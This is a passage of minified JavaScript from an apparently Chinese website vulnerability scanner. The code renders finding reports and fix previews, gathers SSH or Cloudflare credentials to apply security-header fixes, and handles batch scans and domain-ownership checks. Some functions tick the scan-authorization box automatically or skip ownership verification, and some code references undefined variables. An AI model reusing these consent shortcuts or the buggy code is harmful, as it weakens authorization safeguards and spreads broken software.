style="margin-top:8px" open><summary style="cursor:pointer;font-size:13px;font-weight:600;padding:6px;background:var(--bg);border-radius:2px">详细问题列表（'+o.length+" 项）</summary>",g+='<div style="margin-top:6px;max-height:280px;overflow-y:auto">',o.forEach(function(y){let b=y.severity==="high"?"#c75450":y.severity==="medium"?"#f0a732":"#4b6eaf",k=y.severity==="high"?"高":y.severity==="medium"?"中":"低",x=y.fix||y.recommendation||"";g+='<div data-finding-name="'+S(y.name||"")+'" data-severity="'+(y.severity||"low")+'" data-owasp="'+S(y.owasp||"")+'" data-detail="'+S(y.detail||"")+'" data-fix="'+S(x)+'" style="padding:8px;margin-bottom:6px;border-left:3px solid '+b+';background:var(--bg);border-radius:2px">',g+='<div style="display:flex;align-items:center;justify-content:space-between;gap:6px"><div style="font-size:13px;font-weight:600">'+S(y.name||"")+"</div>",g+='<span style="font-size:11px;padding:2px 6px;border-radius:2px;background:'+b+';color:#fff">'+k+"</span>";let z={critical:"P0",high:"P1",medium:"P2",low:"P3"}[y.severity]||"P3",P={P0:"#c75450",P1:"#f0a732",P2:"#f0a732",P3:"#73c990"};g+='<span style="font-size:11px;padding:2px 6px;border-radius:2px;background:#2b2b2b;color:'+P[z]+";font-weight:600;margin-left:6px;border:1px solid "+P[z]+'">'+z+"</span></div>";let R=["sqli","xss","csrf","ssti","open_redirect","cmdi","traversal","deserialization","ssrf","xxe","idor","info_leak","auth_weakness","bruteforce_protection","unauthorized_access","api_auth_missing","sensitive_config_exposure","clickjacking","file_upload","logic_bypass"],j=String(y.type||"").toLowerCase();R.indexOf(j)>=0&&(g+='<div style="margin-top:4px"><span style="font-size:11px;padding:2px 8px;border-radius:2px;background:#2b2b2b;color:#c75450;font-weight:600;border:1px solid #c75450">代码层漏洞</span></div>'),y.owasp&&(g+='<div style="font-size:11px;color:#a5b4fc;margin-top:2px">OWASP: '+y.owasp+"</div>"),y.detail&&(g+='<div style="font-size:12px;color:var(--text-secondary);margin-top:4px">'+S(y.detail)+"</div>"),y.recommendation&&(g+='<div style="font-size:12px;color:#73c990;margin-top:4px">建议：'+S(y.recommendation)+"</div>"),x&&(g+='<details style="margin-top:6px"><summary style="cursor:pointer;font-size:12px;color:var(--primary);font-weight:600">建议</summary>',g+='<pre style="margin-top:4px;padding:8px;background:#0f172a;color:#a7f3d0;border-radius:2px;font-size:12px;line-height:1.4;overflow-x:auto;white-space:pre-wrap;word-break:break-all">'+S(x)+"</pre>",g+="</details>"),x&&(y&&y.verify_steps&&y.verify_steps.length>0?(g+='<details style="margin-top:6px"><summary style="cursor:pointer;font-size:12px;color:var(--success);font-weight:600">如何验证修复</summary>',g+='<div style="margin-top:6px;display:flex;flex-direction:column;gap:5px">',y.verify_steps.forEach(function(M,D){g+='<div style="font-size:11px;padding:5px 8px;background:#2b2b2b;border-radius:2px;border-left:2px solid #73c990">',g+='<div style="font-weight:600;color:var(--text-primary)">第'+(D+1)+"步："+S(M.method||"")+"</div>",M.expect&&(g+='<div style="color:var(--text-secondary);margin-top:2px">预期：'+S(M.expect)+"</div>"),g+="</div>"}),g+="</div></details>"):g+='<div style="margin-top:6px;font-size:12px;color:var(--primary)">验证方法：复测后重新扫描该网站，查看此项是否消失或评分是否提升。</div>'),g+='<div style="margin-top:4px;font-size:11px;color:var(--text-secondary)">说明：如认为此项需要复测，可结合建议、响应证据和二次扫描结果综合判断。</div>',g+="</div>"}),g+="</div></details>"),e&&e.fixes&&Object.keys(e.fixes).length>0){let y=e.fixes,b={nginx:"Nginx",apache:"Apache",express:"Express",flask:"Flask",spring_boot:"Spring Boot",cloudflare:"Cloudflare",python:"Python",nodejs:"Node.js"},x=["nginx","apache","express","flask","spring_boot","cloudflare","nodejs","python"].filter(function(C){return y[C]&&y[C].length>0});x.length>0&&(g+='<div style="margin-top:12px;padding:14px;border:1px solid #73c990;background:#2b2b2b;border-radius:2px">',g+='<div style="font-size:14px;font-weight:600;margin-bottom:8px;color:#73c990">完整建议（'+x.length+" 种平台）</div>",g+='<div style="display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap">',x.forEach(function(C,z){let P=z===0;g+=`<button onclick="switchPublicFixTab('`+C+`')" id="pub-fix-tab-`+C+'" style="padding:4px 10px;border-radius:2px;border:1px solid '+(P?"var(--success)":"var(--border)")+";background:"+(P?"var(--success)":"transparent")+";color:"+(P?"#fff":"var(--text-secondary)")+';cursor:pointer;font-size:12px">'+b[C]+"</button>"}),g+="</div>",x.forEach(function(C,z){let P=z===0?"block":"none",R=y[C];g+='<div id="pub-fix-pane-'+C+'" style="display:'+P+';max-height:240px;overflow-y:auto;background:#2b2b2b;color:#bbbbbb;padding:10px;border-radius:2px;font-size:12px;line-height:1.5;border:1px solid #555555">',R.forEach(function(j,M){let D=typeof j=="string"?j:j&&j.code?j.code:String(j);g+='<div style="margin-bottom:8px;padding-bottom:8px;border-bottom:1px dashed #555555">',g+='<div style="color:#808080;font-size:11px;margin-bottom:2px"># '+(M+1)+"</div>",g+='<pre style="margin:0;white-space:pre-wrap;word-break:break-all">'+S(D)+"</pre>",g+="</div>"}),g+="</div>"}),g+="</div>")}g+='<div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">',g+=`<button onclick="navigateTo('fixer')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">用修复器生成补丁</button>`,ve()?g+='<button onclick="doPublicDemoFix()" style="background:var(--primary-dark,#4f46e5);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">生成修复配置并预览</button>':g+=`<button onclick="navigateTo('profile')" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px">登录后获取修复配置</button>`,g+="</div>",i.innerHTML=g}function bs(e){document.querySelectorAll('[id^="pub-fix-pane-"]').forEach(function(s){s.style.display="none"});let i=document.getElementById("pub-fix-pane-"+e);i&&(i.style.display="block"),document.querySelectorAll('[id^="pub-fix-tab-"]').forEach(function(s){s.style.background="transparent",s.style.color="var(--text-secondary)",s.style.border="1px solid var(--border)"});let t=document.getElementById("pub-fix-tab-"+e);t&&(t.style.background="var(--success)",t.style.color="#fff",t.style.border="1px solid var(--success)")}async function xs(){let e=document.getElementById("public-report-content");if(!e)return;let i=[];if(e.querySelectorAll("[data-finding-name]").forEach(function(t){i.push({name:t.getAttribute("data-finding-name"),severity:t.getAttribute("data-severity")||"low",owasp:t.getAttribute("data-owasp")||"",detail:t.getAttribute("data-detail")||"",fix:t.getAttribute("data-fix")||""})}),i.length===0){L("没有发现需要修复的问题");return}try{if(!(ve()&&window._lastScanId)){if(ve()){let t=document.getElementById("public-report-host")?document.getElementById("public-report-host").value:"https://example.com",s=await ce("/api/scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:t,depth:"standard",authorized:!!(document.getElementById("auth-check-step1")&&document.getElementById("auth-check-step1").checked||document.getElementById("auth-check")&&document.getElementById("auth-check").checked)})});if(s.ok){let r=await s.json();window._lastScanId=r.scan_id}}}}catch{}try{let t={findings:i};window._lastScanId&&(t.scan_id=window._lastScanId);let s=await ce("/api/simulate-fix",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(t)}),r=await s.json();if(!s.ok){L("生成修复配置失败");return}kn(r)}catch(t){L("网络错误："+(t.message||t))}}function kn(e){try{let i=document.getElementById("public-report-content");if(!i)return;if(!e||typeof e!="object"){i.innerHTML='<div class="card"><p style="color:var(--danger)">修复对比数据无效</p></div>';return}let t="";t+='<div style="display:flex;align-items:center;justify-content:space-between;margin-top:8px">',t+='<h3 style="margin:0;font-size:16px">修复效果预览</h3>',t+='<button onclick="loadPublicDemo()" style="background:none;border:1px solid var(--border);color:var(--text);padding:5px 12px;border-radius:2px;cursor:pointer;font-size:12px">← 返回报告</button>',t+="</div>",t+='<div style="background:#3c3f41,rgba(75,110,175,0.08));border:1px solid rgba(16,185,129,0.3);border-radius:2px;padding:14px;margin-top:12px">',t+='<div style="font-size:14px;font-weight:600;color:#73c990">'+e.summary+"</div>",t+="</div>",t+='<div style="display:grid;grid-template-columns:1fr auto 1fr;gap:12px;align-items:center;margin-top:14px">',t+='<div style="text-align:center;background:var(--bg);border:1px solid var(--border);border-radius:2px;padding:14px">',t+='<div style="font-size:12px;color:var(--text-secondary)">复测前</div>',t+='<div style="font-size:36px;font-weight:700;color:#c75450;margin-top:4px">'+e.before_score+"</div>",t+="</div>",t+='<div style="text-align:center;color:#73c990;font-size:24px;font-weight:700">→</div>',t+='<div style="text-align:center;background:rgba(16,185,129,0.08);border:2px solid #73c990;border-radius:2px;padding:14px">',t+='<div style="font-size:12px;color:#73c990">复测后</div>',t+='<div style="font-size:36px;font-weight:700;color:#73c990;margin-top:4px">'+e.after_score+"</div>",t+='<div style="font-size:12px;color:#73c990;margin-top:2px">+ '+e.delta+" 分</div>",t+="</div>",t+="</div>",t+='<h4 style="font-size:14px;margin:14px 0 8px">修复项清单（'+e.fixed_count+" 项）</h4>",t+='<div style="max-height:300px;overflow-y:auto">',e.fixed_items.forEach(function(s,r){let o=s.severity==="high"?"#c75450":s.severity==="medium"?"#f0a732":"#4b6eaf",a=s.severity==="high"?"高":s.severity==="medium"?"中":"低";t+='<div style="display:flex;align-items:flex-start;gap:8px;padding:8px;margin-bottom:6px;background:var(--bg);border-radius:2px;border-left:3px solid '+o+'">',t+='<div style="font-size:14px;font-weight:600;color:#73c990;min-width:24px">'+(r+1)+".</div>",t+='<div style="flex:1"><div style="display:flex;align-items:center;gap:6px"><span style="font-size:12px;font-weight:600">'+S(s.name||"")+"</span>",t+='<span style="font-size:11px;padding:1px 5px;border-radius:2px;background:'+o+';color:#fff">'+a+"</span>",s.owasp&&(t+='<span style="font-size:11px;color:#a5b4fc">'+S(s.owasp)+"</span>"),t+="</div>",s.fix&&(t+='<div style="font-size:12px;color:var(--text-secondary);margin-top:4px;font-family:monospace;background:#0f172a;color:#e2e8f0;padding:6px;border-radius:2px;overflow-x:auto;white-space:pre">'+S(s.fix).substring(0,200)+"</div>"),t+="</div></div>"}),t+="</div>",t+='<div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">',ve()?(t+=`<button onclick="navigateTo('fixer')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">进入修复器获取完整补丁</button>`,t+=`<button onclick="showAutoFixDialog('`+(window._lastScanId||"")+"', "+(e.fixed_count||0)+')" style="background:#73c990;color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">应用修复</button>'):t+=`<button onclick="navigateTo('profile')" style="background:var(--primary);color:#fff;border:none;padding:8px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:600">登录后获取完整补丁代码</button>`,t+="</div>",i.innerHTML=t}catch(i){console.error("renderFixComparison error:",i);let t=document.getElementById("public-report-content");t&&(t.innerHTML='<div class="card"><p style="color:var(--danger)">渲染修复对比失败: '+S(i.message||String(i))+"</p></div>")}}function ws(e,i){try{if(document.getElementById("auto-fix-dialog"))return;if(!e){L("请先完成一次扫描");return}let t="";t+='<div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px" onclick="if(event.target===this)closeAutoFixDialog()">',t+='<div style="background:var(--surface);border-radius:2px;max-width:540px;width:100%;padding:22px;box-shadow:0 20px 60px rgba(0,0,0,0.4)">',t+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">',t+='<h3 style="margin:0;font-size:18px">生成修复配置 '+i+" 项问题</h3>",t+='<button onclick="closeAutoFixDialog()" style="background:none;border:none;font-size:22px;cursor:pointer;color:var(--text-secondary)">×</button>',t+="</div>",t+='<div style="background:rgba(75,110,175,0.08);border:1px solid rgba(75,110,175,0.3);border-radius:2px;padding:12px;margin-bottom:16px;font-size:12px;color:var(--text-secondary)">',t+="<b>安全说明</b>：凭证仅在本请求中使用，不保存到数据库。<br>",t+="<b>修复流程</b>：连接 → 备份 → 写配置 → nginx -t 测试 → reload → 验证头<br>",t+="<b>失败回滚</b>：如 nginx -t 失败，自动停止不会 reload<br>",t+="<b>零停机</b>：用 reload 而非 restart",t+="</div>",t+='<div style="margin-bottom:14px">',t+='<label style="font-size:13px;font-weight:600;display:block;margin-bottom:8px">修复方式</label>',t+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">',t+='<label style="background:var(--bg);border:2px solid var(--primary);border-radius:2px;padding:10px;cursor:pointer;text-align:center" id="opt-ssh">',t+='<input type="radio" name="auto-fix-method" value="ssh" checked style="display:none">',t+='<div style="font-size:20px;color:var(--text-secondary)">SSH</div>',t+='<div style="font-size:12px;font-weight:600;margin-top:4px">SSH 登录服务器</div>',t+='<div style="font-size:11px;color:var(--text-secondary)">需服务器 SSH 账号</div>',t+="</label>",t+='<label style="background:var(--bg);border:2px solid var(--border);border-radius:2px;padding:10px;cursor:pointer;text-align:center" id="opt-cf">',t+='<input type="radio" name="auto-fix-method" value="cloudflare" style="display:none">',t+='<div style="font-size:20px;color:var(--text-secondary)">CF</div>',t+='<div style="font-size:12px;font-weight:600;margin-top:4px">Cloudflare API</div>',t+='<div style="font-size:11px;color:var(--text-secondary)">只需 API 令牌</div>',t+="</label>",t+="</div>",t+="</div>",t+='<div id="ssh-form">',t+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">',t+='<div><label style="font-size:12px;color:var(--text-secondary)">服务器 IP/域名</label><input id="af-host" type="text" placeholder="192.168.1.100" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+='<div><label style="font-size:12px;color:var(--text-secondary)">SSH 端口</label><input id="af-port" type="number" value="22" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+="</div>",t+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">',t+='<div><label style="font-size:12px;color:var(--text-secondary)">SSH 用户名</label><input id="af-user" type="text" value="root" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+='<div><label style="font-size:12px;color:var(--text-secondary)">平台</label><select id="af-platform" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"><option value="nginx">Nginx</option><option value="apache">Apache</option></select></div>',t+="</div>",t+='<div style="margin-bottom:12px"><label style="font-size:12px;color:var(--text-secondary)">SSH 密码 <span style="color:#c75450">*（仅本次使用，不保存）</span></label><input id="af-pass" type="password" placeholder="••••••" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+="</div>",t+='<div id="cf-form" style="display:none">',t+='<div style="margin-bottom:8px"><label style="font-size:12px;color:var(--text-secondary)">Cloudflare API 令牌</label><input id="af-cf-token" type="password" placeholder="Cloudflare 令牌" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+='<div style="margin-bottom:12px"><label style="font-size:12px;color:var(--text-secondary)">Zone（域名，如 example.com）</label><input id="af-cf-zone" type="text" placeholder="示例.com" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+="</div>",t+=`<button onclick="executeAutoFix('`+e+`')" style="width:100%;background:#73c990;color:#fff;border:none;padding:12px;border-radius:2px;cursor:pointer;font-size:14px;font-weight:600;margin-top:8px">生成修复配置并复测</button>`,t+='<div id="af-result" style="margin-top:14px"></div>',t+="</div></div>";let s=document.createElement("div");s.id="auto-fix-dialog",s.innerHTML=t,document.body.appendChild(s),setTimeout(function(){document.querySelectorAll('input[name="auto-fix-method"]').forEach(function(o){o.addEventListener("change",function(){let a=document.getElementById("ssh-form"),n=document.getElementById("cf-form"),d=document.getElementById("opt-ssh"),f=document.getElementById("opt-cf");this.value==="ssh"?(a.style.display="block",n.style.display="none",d.style.borderColor="var(--primary)",f.style.borderColor="var(--border)"):(a.style.display="none",n.style.display="block",d.style.borderColor="var(--border)",f.style.borderColor="var(--primary)")})})},50)}catch(t){console.error("showAutoFixDialog error:",t),L("打开修复配置对话框失败: "+(t.message||String(t)),"error")}}function ks(){let e=document.getElementById("auto-fix-dialog");e&&e.remove()}async function _s(e){let i=document.querySelector('input[name="auto-fix-method"]:checked');if(!i){L("请选择修复方式","error");return}let t=i.value,s=document.getElementById("af-result");if(s){s.innerHTML='<div style="background:var(--bg);border-radius:2px;padding:12px;font-size:12px;color:var(--text-secondary)">正在连接服务器并执行修复，请稍候...</div>';try{let r={scan_id:e};if(t==="ssh"){if(r.credentials={host:document.getElementById("af-host").value.trim(),port:parseInt(document.getElementById("af-port").value)||22,username:document.getElementById("af-user").value.trim()||"root",password:document.getElementById("af-pass").value,platform:document.getElementById("af-platform").value},!r.credentials.host||!r.credentials.password){s.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px;color:#c75450">错误：请填写服务器 IP 和密码</div>';return}}else if(r.cf_token=document.getElementById("af-cf-token").value.trim(),r.cf_zone=document.getElementById("af-cf-zone").value.trim(),!r.cf_token||!r.cf_zone){s.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px;color:#c75450">错误：请填写 CF 令牌 和 Zone</div>';return}let a=await ce(t==="ssh"?"/api/auto-fix":"/api/auto-fix-via-cloudflare",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(r)}),n=await a.json();if(!a.ok||!n.success){s.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px"><b>修复失败</b><br><pre style="margin:6px 0 0;font-size:12px;white-space:pre-wrap">'+S(JSON.stringify(n,null,2))+"</pre></div>";return}let d='<div style="background:rgba(16,185,129,0.1);border:1px solid #73c990;border-radius:2px;padding:12px">';d+='<div style="font-size:14px;font-weight:600;color:#73c990;margin-bottom:8px">修复成功</div>',n.host&&(d+='<div style="font-size:12px;color:var(--text-secondary)">服务器: '+S(n.host)+"</div>"),n.config_path&&(d+='<div style="font-size:12px;color:var(--text-secondary)">配置: '+S(n.config_path)+" ("+n.patch_size_bytes+" 字节)</div>"),n.config_test_ok!==void 0&&(d+='<div style="font-size:12px;color:'+(n.config_test_ok?"#73c990":"#c75450")+'">nginx -t: '+(n.config_test_ok?"配置合法":"配置错误，已停止 reload")+"</div>"),n.verified_headers&&n.verified_headers.length>0&&(d+='<div style="font-size:12px;font-weight:600;margin-top:8px">已验证的安全头：</div>',n.verified_headers.slice(0,6).forEach(function(f){d+='<div style="font-size:11px;font-family:monospace;background:#0f172a;color:#73c990;padding:4px;border-radius:3px;margin-top:2px">'+S(f)+"</div>"})),n.applied!==void 0&&(d+='<div style="font-size:12px;margin-top:8px">Cloudflare: '+n.applied+"/"+n.total+" 头已应用</div>"),d+='<button onclick="closeAutoFixDialog();loadHistory&&loadHistory()" style="width:100%;margin-top:10px;background:var(--primary);color:#fff;border:none;padding:8px;border-radius:2px;cursor:pointer;font-size:12px">完成</button>',d+="</div>",s.innerHTML=d,L("修复配置已应用。已验证 "+(n.verified_headers?n.verified_headers.length:0)+" 个安全头")}catch(r){s.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px">错误：网络错误: '+S(r.message||String(r))+"</div>"}}}function Ss(){if(!ve()&&!isPublicDemoTarget(url)){L("请先登录"),Ee("profile");return}let e=document.getElementById("batch-scan-modal");e&&(e.style.display="flex");let i=document.getElementById("batch-results");i&&(i.innerHTML="")}function Es(){let e=document.getElementById("batch-scan-modal");e&&(e.style.display="none")}async function zs(){let e=(document.getElementById("batch-urls").value||"").trim();if(!e){L("请输入至少 1 个 URL");return}let i=e.split(/\r?\n/).map(function(n){return n.trim()}).filter(Boolean);if(i.length>5){L("最多 5 个 URL");return}let t=document.getElementById("batch-auth-check");if(!t||!t.checked){L("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}let s=document.getElementById("batch-deep"),r=s?s.checked:!1,o=document.getElementById("batch-go-btn");o&&(o.disabled=!0,o.textContent="扫描中…");let a=document.getElementById("batch-results");if(!a){o&&(o.disabled=!1,o.textContent="开始批量扫描");return}a.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary);font-size:13px">正在扫描 '+i.length+" 个目标…</div>";try{let n=await ce("/api/batch-scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({urls:i,deep:r,authorized:!!(t&&t.checked)})}),d=await n.json();if(!n.ok){a.innerHTML='<div style="color:#c75450;padding:10px">错误：'+S(pt(Ue(d)))+"</div>";return}let f='<div style="font-size:13px;font-weight:600;margin-bottom:8px">扫描完成 · '+d.count+" 个目标</div>";d.results.forEach(function(v,c){let p=v.ok?v.score>=80?"#73c990":v.score>=50?"#f0a732":"#c75450":"#808080",h=v.ok?v.score>=80?"rgba(16,185,129,0.1)":v.score>=50?"rgba(240,167,50,0.1)":"rgba(199,84,80,0.1)":"rgba(156,163,175,0.1)";f+='<div style="background:'+h+';border-radius:2px;padding:10px;margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;gap:10px">',f+='<div style="flex:1;min-width:0">',f+='<div style="font-size:12px;color:var(--text-secondary);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+(c+1)+". "+v.url+"</div>",v.ok?f+='<div style="font-size:12px;color:var(--text-secondary);margin-top:3px">高 '+v.high+" · 中 "+v.medium+" · 低 "+v.low+"</div>":f+='<div style="font-size:12px;color:#c75450;margin-top:3px">错误：'+(v.error||"失败")+"</div>",f+="</div>",v.ok?f+='<div style="font-size:20px;font-weight:700;color:'+p+'">'+v.score+"</div>":f+='<div style="font-size:12px;color:#808080">无评分</div>',f+="</div>"}),a.innerHTML=f,L("批量体检完成")}catch(n){a.innerHTML='<div style="color:#c75450;padding:10px">网络错误：'+(n.message||n)+"</div>"}finally{o&&(o.disabled=!1,o.textContent="开始批量体检")}}function xi(e){try{let i=document.getElementById("scan-url"),t=i?i.value.trim():"";if(!t){L("请输入目标网址");return}let s=document.getElementById("auth-check-step1");if(!s||!s.checked){L("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}try{let a=new Date().toISOString();localStorage.setItem("vs_auth_checked_at",a),ve()&&ce("/api/scan-auth-log",{method:"POST",body:JSON.stringify({authorized_at:a})}).catch(function(){})}catch{}if(/^https?:\/\//i.test(t)||(t="https://"+t,i&&(i.value=t)),!ve()){L("请先登录"),Ee("profile");return}let r=document.getElementById("auth-check");if(s&&r&&s.checked){r.checked=!0;let a=document.getElementById("scan-btn");a&&(a.disabled=!1)}let o=document.getElementById("scan-url-confirmed");o&&(o.value=t),yt(),wi()}catch(i){console.error("startScanDirect error:",i),be=!1,ue("scan-btn",!1),ue("scan-btn-step1",!1),L("启动失败："+(i.message||String(i)))}}function ct(){let e=document.getElementById("scan-url"),t=!!(e?e.value.trim():""),s=document.getElementById("auth-check-step1"),r=document.getElementById("auth-check"),o=document.getElementById("scan-btn-step1"),a=document.getElementById("scan-btn"),n=t&&ve(),d=t&&!!(r&&r.checked);o&&(o.disabled=!n),a&&(a.disabled=!d),s&&s.checked&&o&&o.disabled&&(o.disabled=!1)}function yt(){try{ct()}catch{}setTimeout(function(){try{ct()}catch{}},100),setTimeout(function(){try{ct()}catch{}},500)}function Cs(e){let i=document.getElementById(e);if(!i)return;let t=i.value,s=document.getElementById(e+"-btn"),r=s?s.textContent:"",o=function(){s&&(s.textContent="已复制",s.style.background="rgba(115,201,144,0.2)",s.style.color="#16a34a",s.style.borderColor="rgba(115,201,144,0.4)",setTimeout(function(){s.textContent=r,s.style.background="rgba(75,110,175,0.1)",s.style.color="#4f46e5",s.style.borderColor="rgba(75,110,175,0.3)"},1500))};if(navigator.clipboard&&window.isSecureContext)navigator.clipboard.writeText(t).then(o).catch(function(){i.select(),document.execCommand("copy"),o()});else{i.select();try{document.execCommand("copy"),o()}catch{L("复制失败，请手动选择")}}}function Ts(e){try{if(!ve()){L("请先登录后再使用"),Ee("profile");return}let i=document.getElementById("scan-url");i&&(i.value=e);let t=document.getElementById("auth-check-step1");t&&!t.checked&&(t.checked=!0,t.dispatchEvent(new Event("change")));try{let s=new Date().toISOString();localStorage.setItem("vs_auth_checked_at",s),ce("/api/scan-auth-log",{method:"POST",body:JSON.stringify({authorized_at:s})}).catch(function(){})}catch{}xi()}catch(i){console.error("quickDemo error:",i),L("启动未完成："+(i.message||String(i)),"error")}}function Is(){window._publicReportResult&&_t(window._publicReportResult)}function As(){let e=document.getElementById("scan-url"),i=e?e.value.trim():"";if(!i){L("请输入目标网址");return}/^https?:\/\//i.test(i)||(i="https://"+i,e&&(e.value=i));try{let v=new URL(i).hostname.toLowerCase();if(!v){L("网址格式不正确，请输入完整域名（如 example.com）");return}let c=/^(\d{1,3}\.){3}\d{1,3}$/.test(v)||v.indexOf(":")>=0,p=v==="localhost",h=v.indexOf(".")>=0;if(!c&&!p&&!h){L("网址格式不正确，请输入完整域名（如 example.com）或 IP 地址");return}}catch{L("网址格式不正确，请输入有效的 URL");return}xt="vs-"+Math.random().toString(36).substring(2,10)+"-"+Date.now().toString(36);let t=it(i),s=document.getElementById("verify-token"),r=document.getElementById("dns-record"),o=document.getElementById("verify-step-1"),a=document.getElementById("verify-step-2"),n=document.getElementById("verify-method-info"),d=document.getElementById("verify-confirm-btn");s&&(s.textContent=xt),r&&(r.textContent="_vuln-sentinel."+t+' TXT "'+xt+'"'),o&&(o.style.display="none"),a&&(a.style.display="block"),Wt="",n&&(n.innerHTML="<p>请选择一种验证方式</p>"),d&&(d.disabled=!0)}function Bs(e,i){Wt=i,document.querySelectorAll(".verify-method").forEach(function(r){r.classList.remove("selected")}),e&&e.classList.add("selected");let t=document.getElementById("verify-method-info");t&&(i==="dns"?t.innerHTML="<p>已选择 DNS TXT 验证。请在域名 DNS 管理中添加 TXT 记录后点击确认。</p>":t.innerHTML="<p>已选择网站文件验证。请在网站根目录创建验证文件后点击确认。</p>");let s=document.getElementById("verify-confirm-btn");s&&(s.disabled=!1)}function Ls(){if(!ve()){L("请先登录"),Ee("profile");return}let e=document.getElementById("scan-url"),i=e?e.value.trim():"";if(!i){L("请输入目标网址");return}if(/^https?:\/\//i.test(i)||(i="https://"+i,e&&(e.value=i)),!confirm(`跳过域名归属验证将直接进入扫描阶段。该选项仅适用于您已确认拥有该目标网站或正在测试环境使用的场景。

继续吗？`))return;let t=document.getElementById("scan-url-confirmed");t&&(t.value=i);let s=document.getElementById("auth-check");s&&(s.checked=!0),ct();let r=document.getElementById("verify-step-2"),o=document.getElementById("verify-step-3");r&&(r.style.display="none"),o&&(o.style.display="block"),L("已跳过验证，进入快速扫描")}function Os(){if(!Wt){L("请先选择验证方式");return}if(!ve()){L("请先登录"),Ee("profile");return}let e=document.getElementById("verify-confirm-btn"),i=document.getElementById("scan-url"),t=i?i.value.trim():"";if(!t&&urlOverride&&(t=String(urlOverride).trim(),i&&(i.value=t)),!t){L("请输入目标网址");return}/^https?:\/\//i.test(t)||(t="https://"+t,i&&(i.value=t)),e&&(e.disabled=!0,e.textContent="正在查询 DNS / 下载验证文件..."),ce("/api/verify",{method:"POST",body:JSON.stringify({url:t,token:xt,method:Wt})}).then(function(s){return s.json()}).then(function(s){if(e&&(e.disabled=!1,e.textContent="我已添加验证信息，确认验证"),s.success){let r=document.getElementById("scan-url-confirmed");r&&(r.value=t);let o=document.getElementById("auth-check");o&&(o.checked=!0);try{ct()}catch{}let a=document.getElementById("verify-step-2"),n=document.getElementById("verify-step-3");a&&(a.style.display="none"),n&&(n.style.display="block"),L("验证通过："+(s.message||""))}else{L("验证失败："+(s.message||"未找到验证信息"),"error");let r=document.getElementById("verify-method-info");r&&(r.innerHTML='<p style="color:var(--danger)">'+S(s.message||"验证失败")+"</p>")}}).catch(function(s){e&&(e.disabled=!1,e.textContent="我已添加验证信息，确认验证"),L("验证请求失败："+s.message,"error")})}function Rs(){wt(xt),L("令牌 已复制")}function Ms(e,i,t){let s=100;return e.forEach(function(r){r.level==="高风险"?s-=18:r.level==="中风险"?s-=10:r.level==="低风险"&&(s-=4)}),i&&(s+=12),t&&(s+=10),Math.max(10,Math.min(98,s))}function wi(){try{if(be){L("扫描进行中，请稍候");return}if(!ve()&&!isPublicDemoTarget(r)){L("请先登录后再使用扫描功能"),Ee("profile");return}be=!0,ue("scan-btn",!0),ue("scan-btn-step1",!0);let e=document.getElementById("auth-check"),i=document.getElementById("auth-check-step1"),t=e&&e.checked||i&&i.checked||!1;if(!t){be=!1,ue("scan-btn",!1),ue("scan-btn-step1",!1),L("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}e&&!e.checked&&(e.checked=!0);try{let c=new Date().toISOString();localStorage.setItem("vs_auth_checked_at",c),ce("/api/scan-auth-log",{method:"POST",body:JSON.stringify({authorized_at:c})}).catch(function(){})}catch{}let s=document.getElementById("scan-url-confirmed"),r=s?s.value.trim():"";if(!r){let c=document.getElementById("scan-url");r=c?c.value.trim():"",r&&s&&(s.value=r)}if(!r){be=!1,ue("scan-btn",!1),L("请输入有效网址");return}/^https?:\/\//i.test(r)||(r="https://"+r);try{let p=new URL(r).hostname.toLowerCase();if(!p){be=!1,ue("scan-btn",!1),L("网址格式不正确，请输入完整域名（如 example.com）");return}let 